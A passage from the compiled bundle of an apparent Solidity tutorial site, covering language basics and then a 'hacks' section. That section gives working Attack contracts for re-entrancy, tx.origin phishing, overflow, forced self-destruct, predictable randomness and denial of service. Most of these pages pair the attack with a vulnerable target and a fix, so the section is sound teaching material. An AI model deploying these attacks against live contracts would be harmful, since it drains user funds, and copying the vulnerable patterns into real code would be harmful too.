break;\n            }\n        }\n\n        // while loop\n        uint i;\n        while (i &lt; 10) {\n            i++;\n        }\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/library",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Library",description:"Example of how to write and use libraries in your Solidity code",html:'<p>Libraries are similar to contracts, but you can&#39;t declare any state variable and\nyou can&#39;t send ether.</p>\n<p>A library is embedded into the contract if all library functions are internal.</p>\n<p>Otherwise the library must be deployed and then linked before the contract is deployed.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\nlibrary SafeMath {\n    function add(uint x, uint y) internal pure returns (uint) {\n        uint z = x + y;\n        require(z &gt;= x, "uint overflow");\n\n        return z;\n    }\n}\n\ncontract TestSafeMath {\n    using SafeMath for uint;\n\n    uint public MAX_UINT = 2 ** 256 - 1;\n\n    function testAdd(uint x, uint y) public pure returns (uint) {\n        return x.add(y);\n    }\n}\n\n// Array function to delete element at index and re-organize the array\n// so that their are no gaps between the elements.\nlibrary Array {\n    function remove(uint[] storage arr, uint index) public {\n        // Move the last element into the place to delete\n        arr[index] = arr[arr.length - 1];\n        arr.pop();\n    }\n}\n\ncontract TestArray {\n    using Array for uint[];\n\n    uint[] public arr;\n\n    function testArrayRemove() public {\n        for (uint i = 0; i &lt; 3; i++) {\n            arr.push(i);\n        }\n\n        arr.remove(1);\n\n        assert(arr.length == 2);\n        assert(arr[0] == 0);\n        assert(arr[1] == 2);\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/interface",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Interface",description:"An example of interface in Solidity",html:'<p>Interface define contraints so that any contract that implements this can communicate with another contract that require these contraints.</p>\n<p>Interface</p>\n<ul>\n<li>cannot have any functions implemented</li>\n<li>cannot inherit from other contracts, but they can inherit from other interfaces (0.6)</li>\n<li>all declared functions must be external</li>\n<li>cannot declare a constructor</li>\n<li>cannot declare state variables</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nHere is an example where the Zoo contract calls a contract the implements\nthe Animal interface.\n*/\ninterface Animal {\n    enum FoodType { MEAT, PLANT, ANY }\n\n    struct Position {\n        uint x;\n        uint y;\n    }\n\n    event Talk(string message);\n\n    // All functions must be external\n    function move(uint x, uint y) external;\n    function eat(FoodType foodType) external returns (bool);\n    function talk(string calldata message) external;\n}\n\ncontract Wolf is Animal {\n    Position position;\n\n    function talk(string calldata message) external override {\n        emit Talk("Woof!");\n        emit Talk(message);\n    }\n\n    function move(uint x, uint y) external override {\n        position.x = x;\n        position.y = y;\n    }\n\n    function eat(FoodType foodType) external override returns (bool) {\n        return foodType == FoodType.MEAT;\n    }\n}\n\ncontract Zoo {\n    function feed(address _animal, Animal.FoodType foodType) public returns (bool) {\n        Animal animal = Animal(_animal);\n\n        animal.talk("I&#39;m hungry");\n\n        return animal.eat(foodType);\n    }\n}</code></pre>\n'})}},{path:"/0.6/inheritance",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Inheritance",description:"Example of inheritance in Solidity",html:'<p>Solidity supports multiple inheritance. Contracts can inherit other contract by using the <code>is</code> keyword.</p>\n<p>Order of inheritance is important.</p>\n<p>You have to list the parent contracts in the order from \u201cmost base-like\u201d to \u201cmost derived\u201d.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/* Graph of inheritance\n    A\n   / \\\n  B   C\n / \\ /\nF  D,E\n\n*/\n\ncontract A {\n    function foo() public pure virtual returns (string memory) {\n        return "A";\n    }\n}\n\n// Contracts inherit other contracts by using the keyword &#39;is&#39;.\ncontract B is A {\n    // Override A.foo()\n    function foo() public pure virtual override returns (string memory) {\n        return "B";\n    }\n}\n\ncontract C is A {\n    // Override A.foo()\n    function foo() public pure virtual override returns (string memory) {\n        return "C";\n    }\n}\n\n// Contracts can inherit from multiple parent contracts.\n// When a function is called that is defined multiple times in\n// different contracts, parent contracts are searched from\n// right to left, and in depth-first manner.\n\ncontract D is B, C {\n    // D.foo() returns "C"\n    // since C is the right most parent contract with function foo()\n    function foo() public pure override(B, C) returns (string memory) {\n        return super.foo();\n    }\n}\n\ncontract E is C, B {\n    // E.foo() returns "B"\n    // since B is the right most parent contract with function foo()\n    function foo() public pure override(C, B) returns (string memory) {\n        return super.foo();\n    }\n}\n\n// Inheritance must be ordered from \u201cmost base-like\u201d to \u201cmost derived\u201d.\n// Swapping the order of A and B will throw a compilation error.\ncontract F is A, B {\n    function foo() public pure override(A, B) returns (string memory) {\n        return super.foo();\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/import",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Import",description:"Learn how to import other Solidity files",html:'<p>You can import local and external files in Solidity.</p>\n<h3 id="local">Local</h3>\n<p>Here is our folder structure.</p>\n<pre><code>\u251c\u2500\u2500 Import.sol\n\u2514\u2500\u2500 Foo.sol</code></pre>\n<p>Foo.sol</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Foo {\n    string public name = "Foo";\n}\n</code></pre>\n<p>Import.sol</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n// import Foo.sol from current directory\nimport "./Foo.sol";\n\ncontract Import {\n    // Initialize Foo.sol\n    Foo public foo = new Foo();\n\n    // Test Foo.sol by getting it&#39;s name.\n    function getFooName() public view returns (string memory) {\n        return foo.name();\n    }\n}\n</code></pre>\n<h3 id="external">External</h3>\n<p>You can also import from <a href="https://github.com">GitHub</a> by simply copying the url</p>\n<pre><code class="language-solidity">// https://github.com/owner/repo/blob/branch/path/to/Contract.sol\nimport "https://github.com/owner/repo/blob/branch/path/to/Contract.sol";\n\n// Example import ECDSA.sol from openzeppelin-contract repo, release-v3.0.0 branch\n// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/cryptography/ECDSA.sol\nimport "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/cryptography/ECDSA.sol";</code></pre>\n'})}},{path:"/0.6/if-else",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"If / Else",description:"If / Else conditional statement in Solidity",html:'<p>Solidity support conditional statements <code>if</code>, <code>else if</code> and <code>else</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract IfElse {\n    function foo(uint x) public pure returns (uint) {\n        if (x &lt; 10) {\n            return 0;\n        } else if (x &lt; 20) {\n            return 1;\n        } else {\n            return 2;\n        }\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/hello-world",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Hello World",description:"Hello world in Solidity",html:'<p><code>pragma</code> specifies the compiler version of Solidity.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\n// compiler version must be greater than or equal to 0.6.10 and less than 0.7.0\npragma solidity ^0.6.10;\n\ncontract HelloWorld {\n    string public greet = "Hello World!";\n}\n</code></pre>\n'})}},{path:"/0.6/hashing",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Hashing with Keccak256",description:"Example of hashing using Keccak256 in Solidity",html:'<p><code>keccak256</code> computes the Keccak-256 hash of the input.</p>\n<p>Some use cases are:</p>\n<ul>\n<li>Creating an deterministic unique ID from a input</li>\n<li>Commit-Reveal scheme</li>\n<li>Compact cryptographic signature (by signing the hash instead of a larger input)</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract HashFunction {\n    function hash(string memory _text, uint _num, address _addr)\n        public pure returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(_text, _num, _addr));\n    }\n\n    // Example of hash collision\n    // Hash collision can occur when you pass more than one dynamic data type\n    // to abi.encodePacked. In such case, you should use abi.encode instead.\n    function collision(string memory _text, string memory _anotherText)\n        public pure returns (bytes32)\n    {\n        // encodePacked(AAA, BBB) -&gt; AAABBB\n        // encodePacked(AA, ABBB) -&gt; AAABBB\n        return keccak256(abi.encodePacked(_text, _anotherText));\n    }\n}\n\ncontract GuessTheMagicWord {\n    bytes32 public answer =\n        0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00;\n\n    // Magic word is "Solidity"\n    function guess(string memory _word) public view returns (bool) {\n        return keccak256(abi.encodePacked(_word)) == answer;\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/hacks/self-destruct",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Self Destruct",description:"An example of how to delete your smart contract by calling seldestruct in Solidity",html:'<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>\n<p><code>selfdestruct</code> sends all remainig Ether stored in the contract to an\ndesignated address.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>A malicious contract can use <code>selfdestruct</code> to\nforce send Ether to any contract.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n// The goal of this game is to be the 7th player to deposit 1 Ether.\n// Players can deposit only 1 Ether at a time.\n// Winner will be able to withdraw all Ether.\n\n/*\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game\n   No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\n*/\n\ncontract EtherGame {\n    uint public targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, "You can only send 1 Ether");\n\n        uint balance = address(this).balance;\n        require(balance &lt;= targetAmount, "Game is over");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, "Not winner");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) public {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function attack() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance &gt;= 7 ether\n\n        // cast address to payable\n        address payable addr = address(uint160(address(etherGame)));\n        selfdestruct(addr);\n    }\n}\n\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>Don&#39;t rely on <code>address(this).balance</code></p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract EtherGame {\n    uint public targetAmount = 3 ether;\n    uint public balance;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, "You can only send 1 Ether");\n\n        balance += msg.value;\n        require(balance &lt;= targetAmount, "Game is over");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, "Not winner");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}("");\n        require(sent, "Failed to send Ether");\n    }\n}</code></pre>\n'})}},{path:"/0.6/hacks/re-entrancy",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Re-Entrancy",description:"An example of re-entrancy attack in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Let&#39;s say that contract <code>A</code> calls contract <code>B</code>.</p>\n<p>Reentracy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n// EtherStore is a contract vulnerable to re-entrancy attack. Let&#39;s see why.\n\n/*\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n5. Call Attack.collectEther to withdraw Ether from Attack\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n*/\n\ncontract EtherStore {\n    // Withdrawal limit = 1 ether / week\n    uint public withdrawalLimit = 1 ether;\n    mapping(address =&gt; uint) public lastWithdrawTime;\n    mapping(address =&gt; uint) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint _amount) public {\n        require(balances[msg.sender] &gt;= _amount);\n        require(_amount &lt;= withdrawalLimit);\n        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);\n\n        (bool sent, ) = msg.sender.call{value: _amount}("");\n        require(sent, "Failed to send Ether");\n\n        balances[msg.sender] -= _amount;\n        lastWithdrawTime[msg.sender] = now;\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    EtherStore public etherStore;\n\n    constructor(address _etherStoreAddress) public {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance &gt;= 1 ether) {\n            etherStore.withdraw(1 ether);\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value &gt;= 1 ether);\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw(1 ether);\n    }\n\n    function collectEther() public {\n        (bool sent, ) = msg.sender.call{value: address(this).balance}("");\n        require(sent, "Failed to send Ether");\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Ensure all state changes happen before calling external contracts</li>\n<li>Use function modifiers that prevent re-entrancy</li>\n</ul>\n<p>Here is a example of a re-entracy guard</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, "No re-entrancy");\n        locked = true;\n        _;\n        locked = false;\n    }\n}</code></pre>\n'})}},{path:"/0.6/hacks/randomness",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Source of Randomness",description:"Blockchain is not a reliable source of randomness in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>blockhash</code> and <code>block.timestamp</code> are not reliable sources for randomness.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nNOTE: cannot use blockhash in Remix so use ganache-cli\n\nnpm i -g ganache-cli\nganache-cli\nIn remix switch environment to Web3 provider\n*/\n\n/*\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let&#39;s see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n*/\n\ncontract GuessTheRandomNumber {\n    constructor() public payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(keccak256(abi.encodePacked(\n            blockhash(block.number - 1),\n            block.timestamp\n        )));\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}("");\n            require(sent, "Failed to send Ether");\n        }\n    }\n}\n\ncontract Attack {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n         uint answer = uint(keccak256(abi.encodePacked(\n            blockhash(block.number - 1),\n            block.timestamp\n        )));\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t use <code>blockhash</code> and <code>block.timestamp</code> as source of randomness</li>\n</ul>\n'})}},{path:"/0.6/hacks/phishing-with-tx-origin",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Phishing with tx.origin",description:"An example of phishing with tx.origin in Solidity",html:'<h3 id="whats-the-difference-between-msgsender-and-txorigin">What&#39;s the difference between <code>msg.sender</code> and <code>tx.origin</code>?</h3>\n<p>If contract A calls B, and B calls C, in C <code>msg.sender</code> is B and <code>tx.origin</code> is A.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>A malicious contract can deceive the owner of a contract into calling a\nfunction that only the owner should be able to call.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let&#39;s see how we can hack this contract\n*/\n\n/*\n1. Alice deploys Wallet with 10 Ether\n2. Eve deploys Attack with the address of Alice&#39;s Wallet contract.\n3. Eve tricks Alice to call Attack.attack()\n4. Eve successfully stole Ether from Alice&#39;s wallet\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice&#39;s wallet to Eve&#39;s address.\nSince tx.origin in Wallet.transfer() is equal to Alice&#39;s address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n*/\n\ncontract Wallet {\n    address public owner;\n\n    constructor() public payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        require(tx.origin == owner, "Not owner");\n\n        (bool sent, ) = _to.call{value: _amount}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) public {\n        wallet = Wallet(_wallet);\n        owner = msg.sender;\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>Use <code>msg.sender</code> instead of <code>tx.origin</code></p>\n<pre><code class="language-solidity">    function transfer(address payable _to, uint _amount) public {\n        require(msg.sender == owner, "Not owner");\n\n        (bool sent, ) = _to.call.value(_amount)("");\n        require(sent, "Failed to send Ether");\n    }</code></pre>\n'})}},{path:"/0.6/hacks/overflow",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Arithmetic Overflow and Underflow",description:"An example of hacking Solidity with arithmetic overflow / underflow",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Integers in Solidity overflow / underflow without any errors.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n// This contract is designed to act as a time vault.\n// User can deposit into this contract but cannot withdraw for atleast a week.\n// User can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/\n\ncontract TimeLock {\n    mapping(address =&gt; uint) public balances;\n    mapping(address =&gt; uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = now + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] &gt; 0, "Insufficient funds");\n        require(now &gt; lockTime[msg.sender], "Lock time not expired");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) public {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    fallback() external payable {}\n\n    function attack() public payable {\n        timeLock.deposit{value: msg.value}();\n        timeLock.increaseLockTime(\n            uint(-1) - timeLock.lockTime(address(this)) + 1\n        );\n        timeLock.withdraw();\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Use <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol" target="__blank">SafeMath</a> to will prevent arithmetic overflow and underflow</li>\n</ul>\n'})}},{path:"/0.6/hacks/honeypot",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Honeypot",description:"An example of honeypot in Solidity",html:'<p>A honeypot is a trap to catch hackers.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>Combining two exploits, reentrancy and hiding malicious code, we can build a contract</p>\n<p>that will catch malicious users.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nBank is a contract that calls Logger to log events.\nBank.withdraw() is vulnerable to the reentrancy attack.\nSo a hacker tries to drain Ether from Bank.\nBut actually the reentracy exploit is a bait for hackers.\nBy deploying Bank with HoneyPot in place of the Logger, this contract becomes\na trap for hackers. Let&#39;s see how.\n\n1. Alice deploys HoneyPot\n2. Alice deploys Bank with the address of HoneyPot\n3. Alice deposits 1 Ether into Bank.\n4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.\n5. Eve deploys Attack with the address of Bank\n6. Eve calls Attack.attack() with 1 Ether but the transaction fails.\n\nWhat happened?\nEve calls Attack.attack() and it starts withdrawing Ether from Bank.\nWhen the last Bank.withdraw() is about to complete, it calls logger.log().\nLogger.log() calls HoneyPot.log() and reverts. Transaction fails.\n*/\n\ncontract Bank {\n    mapping (address =&gt; uint) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) public {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value,"Deposit");\n    }\n\n    function withdraw(uint _amount) public {\n        require(_amount &lt;= balances[msg.sender], "Insufficient funds");\n\n        (bool sent, ) = msg.sender.call{value: _amount}("");\n        require(sent, "Failed to send Ether");\n\n        balances[msg.sender] -= _amount;\n\n        logger.log(msg.sender, _amount, "Withdraw");\n    }\n}\n\ncontract Logger {\n    event Log(address caller, uint amount, string action);\n\n    function log(address _caller, uint _amount, string memory _action) public {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\n// Hacker tries to drain the Ethers stored in Bank by reentrancy.\ncontract Attack {\n    Bank bank;\n\n    constructor(Bank _bank) public {\n        bank = Bank(_bank);\n    }\n\n    fallback() external payable {\n        if (address(bank).balance &gt;= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n// Let&#39;s say this code is in a separate file so that others cannot read it.\ncontract HoneyPot {\n    function log(address _caller, uint _amount, string memory _action)\n        public\n    {\n        if (equal(_action, "Withdraw")) {\n            revert("It&#39;s a trap");\n        }\n    }\n\n    // Function to compare strings using keccak256\n    function equal(string memory _a, string memory _b)\n        public pure returns (bool)\n    {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/hacks/hiding-malicious-code-with-external-contract",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Hiding Malicious Code with External Contract",description:"An example of exploit where malicious code is hidden in an external contract in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>In Solidity any address can be casted into specific contract,\neven if the contract at the address is not the one being casted.</p>\n<p>This can be exploited to hide malicious code. Let&#39;s see how.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nLet&#39;s say Alice can see the code of Foo and Bar but not Mal.\nIt is obvious to Alice that Foo.callBar() executes the code inside Bar.log().\nHowever Eve deploys Foo with the address of Mal, so that calling Foo.callBar()\nwill actually execute the code at Mal.\n*/\n\n/*\n1. Eve deploys Mal\n2. Eve deploys Foo with the address of Mal\n3. Alice calls Foo.callBar() after reading the code and judging that it is\n   safe to call.\n4. Although Alice expected Bar.log() to be execute, Mal.log() was executed.\n*/\n\ncontract Foo {\n    Bar bar;\n\n    constructor(address _bar) public {\n        bar = Bar(_bar);\n    }\n\n    function callBar() public {\n        bar.log();\n    }\n}\n\ncontract Bar {\n    event Log(string message);\n\n    function log() public {\n        emit Log("Bar was called");\n    }\n}\n\n// This code is hidden in a separate file\ncontract Mal {\n    event Log(string message);\n\n    // function () external {\n    //     emit Log("Mal was called");\n    // }\n\n    // Actually we can execute the same exploit even if this function does\n    // not exit by using the fallback\n    function log() public {\n        emit Log("Mal was called");\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Initialize a new contract inside the constructor</li>\n<li>Make the address of external contract <code>public</code> so that the code of the\nexternal contract can be reviewed</li>\n</ul>\n<pre><code class="language-solidity">Bar public bar;\n\nconstructor() public {\n    bar = new Bar();\n}</code></pre>\n'})}},{path:"/0.6/hacks/front-running",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Front Running",description:"An example of a Solidity contract vulnerable to front running",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Transactions take some time before they are mined. An attacker can watch the transaction pool\nand send a transaction, have it included in a block before the original transaction.\nThis mechanism can be abused to re-order transactions to the attacker&#39;s advantage.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nAlice creates a guessing game.\nYou win 10 ether if you can find the correct string that hashes to the target\nhash. Let&#39;s see how this contract is vulnerable to front running.\n*/\n\n/*\n1. Alice deploys FindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. ("Ethereum")\n3. Bob calls solve("Ethereum") with gas price set to 15 gwei.\n4. Eve is watching the transaction pool for the answer to be submitted.\n5. Eve sees Bob&#39;s answer and calls solve("Ethereum") with a higher gas price\n   than Bob (100 gwei).\n6. Eve&#39;s transaction was mined before Bob&#39;s transaction.\n   Eve won the reward of 10 ether.\n\nWhat happened?\nTransactions take some time before they are mined.\nTransactions not yet mined are put in the transaction pool.\nTransactions with higher gas price are typically mined first.\nAn attacker can get the answer from the transaction pool, send a transaction\nwith a higher gas price so that their transaction will be included in a block\nbefore the original.\n*/\n\ncontract FindThisHash {\n    bytes32 constant public hash =\n      0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;\n\n    constructor() public payable {}\n\n    function solve(string memory solution) public {\n        require(hash == keccak256(abi.encodePacked(solution)), "Incorrect answer");\n\n        (bool sent, ) = msg.sender.call{value: 10 ether}("");\n        require(sent, "Failed to send Ether");\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>use commit-reveal scheme</li>\n<li>use submarine send</li>\n</ul>\n'})}},{path:"/0.6/hacks/denial-of-service",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Denail of Service",description:"An example of denial of service hack in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>There are many ways to attack a smart contract to make it unusable.</p>\n<p>One exploit we introduce here is denial of service by making the function to send Ether fail.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n/*\nThe goal of KingOfEther is to become the king by sending more Ether than\nthe previous king. Previous king will be refunded with the amount of Ether\nhe sent.\n*/\n\n/*\n1. Deploy KingOfEther\n2. Alice becomes the king by sending 1 Ether to claimThrone().\n2. Bob becomes the king by sending 2 Ether to claimThrone().\n   Alice receives a refund of 1 Ether.\n3. Deploy Attack with address of KingOfEther.\n4. Call attack with 3 Ether.\n5. Current king is the Attack contract and no one can become the new king.\n\nWhat happened?\nAttack became the king. All new challenge to claim the throne will be rejected\nsince Attack contract does not have a fallback function, denying to accept the\nEther sent from KingOfEther before the new king is set.\n*/\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value &gt; balance, "Need to pay more to become the king");\n\n        (bool sent, ) = king.call{value: balance}("");\n        require(sent, "Failed to send Ether");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) public {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    // You can also perform a DOS by consuming all gas using assert.\n    // This attack wil work even if the calling contract does not check\n    // whether the call was successful or not.\n    //\n    // function () external payable {\n    //     assert(false);\n    // }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>One way to prevent this is to allow the users to withdraw their Ether instead of sending it.</p>\n<p>Here is a example.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n    mapping(address =&gt; uint) public balances;\n\n    function claimThrone() external payable {\n        require(msg.value &gt; balance, "Need to pay more to become the king");\n\n        balances[king] += balance;\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n\n    function withdraw() public {\n        require(msg.sender != king, "Current king cannot withdraw");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/hacks/delegatecall",component:function(){return 